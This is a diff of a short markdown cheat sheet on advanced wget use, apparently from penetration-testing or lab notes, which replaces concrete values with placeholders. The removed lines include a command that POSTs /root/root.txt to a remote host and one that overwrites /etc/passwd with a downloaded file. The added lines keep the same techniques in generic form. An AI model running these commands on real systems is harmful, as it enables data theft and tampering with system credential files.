@@ -4,24 +4,23 @@ date: 2024-7-5
 tags: ["wget", "file transfer", "http", "web"]
 ---
 
----
 ### Advance wget
 
 <div>
 
-```bash
+```console
 # Provide a file with urls
-wget --input-file /root/root.txt
+wget --input-file <FILE_PATH>
 ```
 
-```bash
+```console
 # POST a file
-wget --post-file /root/root.txt http://10.10.14.10
+wget --post-file <FILE_PATH> <TARGET>
 ```
 
-```bash
+```console
 # Overwrite a file
-wget http://10.10.14.10/passwd.txt -O /etc/passwd
+wget <TARGET>/<FILE> -O <FILE_PATH>
 ```
 
 </div>
